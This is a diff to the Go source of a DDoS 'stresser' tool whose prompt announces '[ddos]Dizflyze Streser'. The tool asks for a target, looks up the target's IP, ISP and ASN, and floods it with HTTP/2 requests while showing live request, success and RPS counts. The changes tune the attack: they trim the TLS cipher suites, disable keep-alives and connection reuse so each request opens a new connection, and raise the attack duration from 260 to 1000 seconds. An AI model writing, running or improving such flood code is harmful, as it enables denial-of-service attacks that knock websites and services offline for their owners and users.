@@ -974,38 +974,19 @@ func CH2T() *http.Transport {
 			MaxVersion:         tls.VersionTLS13,
 			CipherSuites: []uint16{
 				tls.TLS_AES_128_GCM_SHA256,
-		    	tls.TLS_AES_256_GCM_SHA384,
-				tls.TLS_CHACHA20_POLY1305_SHA256,
-				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-				tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
-				tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,
-				tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
-				tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-				tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
-				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-				tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
-				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_RSA_WITH_AES_128_CBC_SHA256,
 			},
 			CurvePreferences: []tls.CurveID{
 				tls.X25519,
 				tls.CurveP256,
-				tls.CurveP384,
-				tls.CurveP521,
 			},
 			NextProtos:         []string{"h2"},
 			ClientSessionCache: tls.NewLRUClientSessionCache(1000),
 		},
-		DisableKeepAlives:   false,
-		MaxIdleConns:        30000,
-		MaxIdleConnsPerHost: 30000,
+		DisableKeepAlives:   true,
+		MaxIdleConns:        0,
+		MaxIdleConnsPerHost: 0,
 		MaxConnsPerHost:     0,
-		IdleConnTimeout:     3 * time.Second,
+		IdleConnTimeout:     0 * time.Second,
 		DialContext: (&net.Dialer{
 			Timeout:   3 * time.Second,
 			KeepAlive: 3 * time.Second,
@@ -1115,7 +1096,7 @@ func AW(target string, host string, wg *sync.WaitGroup, stopChan chan struct{}) 
 func main() {
 	L()
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Print(Reset + "╔═[ddos]Dizflyze Streser]\n╚══➤ " + Reset)
+	fmt.Print(Reset + "╔═[ddos]Dizflyze Streser]\n╠══➤ " + Reset)
 	input, _ := reader.ReadString('\n')
 	target := strings.TrimSpace(input)
 
@@ -1129,7 +1110,7 @@ func main() {
 	HIP := RH(host)
 	ISP, ASN, CHS := GIPD(HIP)
 
-	duration := 260 * time.Second
+	duration := 1000 * time.Second
 	stopChan := make(chan struct{})
 	var wg sync.WaitGroup
 
@@ -1152,8 +1133,8 @@ func main() {
 				success := atomic.LoadInt64(&successCount)
 				RPS := float64(total) / elapsed.Seconds()
 				
-				fmt.Printf("\r%s%s%s REQ: %s%d%s | OK: %s%d%s | RPS: %s%.0f", 
-						    Reset, time.Now().Format("04:05"), Reset,
+				fmt.Printf("\r%s╚══➤ %s%s ➤ %s%d%s ➤ %s%d%s ➤ %s%.0f",
+						    Reset, time.Now().Format("05"), Reset,
  						   Yellow, total, Reset,
  						   Green, success, Reset,
 						    Cyan, RPS)
